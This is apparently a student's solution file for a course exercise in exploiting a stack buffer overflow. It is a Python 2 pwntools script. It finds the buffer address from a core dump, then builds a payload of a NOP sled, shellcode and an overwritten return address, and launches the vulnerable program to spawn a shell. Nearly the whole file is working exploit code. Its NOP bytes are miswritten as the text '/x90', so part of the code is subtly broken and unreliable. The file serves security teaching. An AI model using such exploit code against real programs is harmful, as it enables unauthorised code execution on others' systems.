from pwn import *

from shellcode import get_shellcode

# =============================================
# ========= write your code below  ============
# =============================================

''' returns the payload for the attack 
    given the path to the vulnerable binary
    and the shellcode from get_shellcode in shellcode.py
    (string, string) -> (string, string)
'''
def craft_payload(path_to_vuln_prgm, shellcode):
    # similar to stack smashing branching
    payload = cyclic(272)
    p = process([path_to_vuln_prgm, payload])
    p.wait_for_close()
    core = Coredump('./core')
    buf_addr = core.esp - 272

    # imitate payload
    leng = 268-128-len(shellcode)
    final = ('/x90'*128) + shellcode +  ('a'*leng) + p32(buf_addr+64)
    return final

# =============================================
# ===== do not modify the code below ==========
# =============================================

def execute_interactive(path_to_vuln_prgm, payload):
    p = process([path_to_vuln_prgm, payload])
    p.interactive()
    
def execute_non_interactive(path_to_vuln_prgm, payload):
    p = process([path_to_vuln_prgm, payload])
    print p.recvall()

def run(path_to_vuln_prgm):
    interactive, shellcode = get_shellcode()
    payload = craft_payload(path_to_vuln_prgm, shellcode)
    if interactive: 
       execute_interactive(path_to_vuln_prgm, payload)
    else:
       execute_non_interactive(path_to_vuln_prgm, payload)
    
if __name__ == "__main__":
   import os, sys, getopt
   def usage():
        print ('Usage:    ' + os.path.basename(__file__) + ' path_to_vuln_prgm')
        sys.exit(2)
   try:
      opts, args = getopt.getopt(sys.argv[1:],"h",["help"])
   except getopt.GetoptError as err:
      print(err)
      usage()
   # extract parameters
   path_to_vuln_prgm = args[0] if len(args) > 0 else None
   for opt, arg in opts:
        if opt in ("-h", "--help"):
           usage()
   # check arguments
   if (path_to_vuln_prgm is None):
       print('path_to_vuln_prgm is missing\n')
       usage()
   # run the command
   run(path_to_vuln_prgm)

